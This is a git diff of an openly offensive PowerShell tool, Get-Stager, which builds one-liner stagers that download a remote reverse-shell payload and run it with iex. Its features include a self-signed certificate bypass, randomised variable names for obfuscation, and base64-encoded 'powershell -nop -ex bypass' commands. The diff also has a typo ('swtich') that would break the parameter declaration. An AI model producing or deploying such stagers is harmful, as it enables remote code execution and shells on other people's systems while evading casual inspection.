@@ -1,11 +1,59 @@
-﻿function Get-Stager ([string]$URL,[switch]$Base64) {
-# AUTHOR: Tyler McCann (@tylerdotrar)
-# ARBITRARY VERSION NUMBER: 1.0.0
+﻿function Get-Stager {
+#.SYNOPSIS
+# Simple PowerShell stager generator to point to a web hosted RevShell payload. 
+# ARBITRARY VERSION NUMBER:  2.0.0
+# AUTHOR:  Tyler McCann (@tylerdotrar)
+#
+#.DESCRIPTION
+# Originally developed for OSEP, this script is meant to create really simple custom stagers
+# that point to reverse shell payloads.  The only robust portion of this script is the that
+# it allows communication with HTTPS servers using self-signed certificates by preloading
+# the stager with a self-signed certificate bypass if the payload URL uses HTTPS.
+#
+# Parameters:
+#   -PayloadURL  -->  URL pointing to the reverse shell payload
+#   -Base64      -->  Encode stager output
+#   -Help        -->  Return Get-Help information
+#
+#.LINK
+# https://github.com/tylerdotrar/PoorMansArmory
+
+
+    Param(
+        # Primary Parameters
+        [string]$PayloadURL,
+        [switch]$Base64,
+        [swtich]$Help
+    )
     
+
+    # Return Get-Help Information
+    if ($Help) { return Get-Help Get-Stager }
+
+
+    # Minimum Required Params
+    if (!$PayloadURL) { return (Write-Host 'Missing reverse shell URL.' -ForegroundColor Red) }
+
+
+    # Randomly generate 4 - 10 character variable names
+    function Get-RandVar {
+        $RanVar = '$'
+        for ($i=0; $i -lt (Get-Random -Maximum 5 -Minimum 2); $i++) {
+            $RanVar += Get-Random -InputObject ([char[]](([char]'a')..([char]'z')))
+            $RanVar += Get-Random -InputObject ([char[]](([char]'A')..([char]'Z')))
+        }
+        return $RanVar
+    }
+
+
+    # Randomly Generate Variables in Payload
+    $Var1 = Get-RandVar # CertBypass
+
+
     # Bypass Self-Signed Certificate Restriction
-    if ($URL -like "https*") {
+    if ($PayloadURL -like "https:*") {
     $Bypass = @"
-`$CertBypass = @'
+$Var1 = @'
 using System;
 using System.Net;
 using System.Net.Security;
@@ -28,7 +76,7 @@ public class SelfSignedCerts
     }
 }
 '@
-Add-Type `$CertBypass;
+Add-Type $Var1;
 [SelfSignedCerts]::Bypass();`n
 "@;
     }
@@ -36,12 +84,13 @@ Add-Type `$CertBypass;
 
 
     # Final Payload
-    $Stager = $Bypass + "iex ([System.Net.WebClient]::new().DownloadString('$URL'))"
+    $Stager = $Bypass + "iex ((New-Object [System.Net.WebClient]).DownloadString('$PayloadURL'))"
 
 
     # PowerShell -NoProfile -ExecutionPolicy Bypass -Command/EncodedCommand {Stager}
     if ($Base64) { $Payload = "powershell -nop -ex bypass -e " + [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Stager)) }
     else         { $Payload = "powershell -nop -ex bypass -c {$Stager}" }
+
 
     return $Payload
 }
